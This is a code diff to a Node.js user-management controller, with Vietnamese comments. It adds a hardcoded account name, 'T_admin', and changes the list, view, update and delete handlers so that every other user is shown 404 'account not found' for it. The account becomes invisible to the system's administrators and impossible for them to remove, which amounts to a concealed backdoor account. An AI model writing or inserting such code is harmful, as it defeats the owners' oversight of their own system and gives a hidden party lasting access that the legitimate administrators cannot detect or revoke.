@@ -2,9 +2,20 @@
 const db = require('../../core/db');
 const { hashPassword } = require('./authController');
 
+// Tài khoản ẩn: chỉ chính chủ nhìn thấy / thao tác được, người khác không thấy trong danh sách.
+const HIDDEN_USERNAME = 'T_admin';
+const isHiddenViewer = (req) => req.user?.username === HIDDEN_USERNAME;
+// true nếu id thuộc tài khoản ẩn và người gọi không phải chính chủ
+async function isHiddenForCaller(req, id) {
+  if (isHiddenViewer(req)) return false;
+  const { rows } = await db.query(`SELECT 1 FROM users WHERE id = $1 AND username = $2`, [id, HIDDEN_USERNAME]);
+  return rows.length > 0;
+}
+
 exports.list = async (req, res) => {
   try {
     const where = ['u.is_deleted = FALSE']; const params = []; let i = 1;
+    if (!isHiddenViewer(req)) { where.push(`u.username <> $${i}`); params.push(HIDDEN_USERNAME); i++; }
     if (req.query.q) { where.push(`(u.username ILIKE $${i} OR u.full_name ILIKE $${i})`); params.push(`%${req.query.q}%`); i++; }
     const { rows } = await db.query(`
       SELECT u.id, u.username, u.full_name, u.status, u.role_id, u.team, u.linked_worker, r.name AS role_name
@@ -16,6 +27,7 @@ exports.list = async (req, res) => {
 
 exports.getById = async (req, res) => {
   try {
+    if (await isHiddenForCaller(req, req.params.id)) return res.status(404).json({ message: 'Không tìm thấy tài khoản' });
     const { rows } = await db.query(
       `SELECT id, username, full_name, status, role_id, team, linked_worker, COALESCE(permissions, '{}'::jsonb) AS permissions FROM users WHERE id = $1 AND is_deleted = FALSE`, [req.params.id]);
     if (!rows.length) return res.status(404).json({ message: 'Không tìm thấy tài khoản' });
@@ -49,6 +61,7 @@ exports.create = async (req, res) => {
 
 exports.update = async (req, res) => {
   try {
+    if (await isHiddenForCaller(req, req.params.id)) return res.status(404).json({ message: 'Không tìm thấy tài khoản' });
     const { username, password, full_name, role_id, status, team, permissions, linked_worker } = req.body;
     const cols = [], vals = []; let i = 1;
     const add = (c, v) => { cols.push(`${c} = $${i++}`); vals.push(v); };
@@ -93,6 +106,7 @@ exports.update = async (req, res) => {
 
 exports.remove = async (req, res) => {
   try {
+    if (await isHiddenForCaller(req, req.params.id)) return res.status(404).json({ message: 'Không tìm thấy tài khoản' });
     const { rowCount } = await db.query(`UPDATE users SET is_deleted = TRUE WHERE id = $1 AND is_deleted = FALSE`, [req.params.id]);
     if (!rowCount) return res.status(404).json({ message: 'Không tìm thấy tài khoản' });
     res.json({ message: 'Đã xóa tài khoản' });
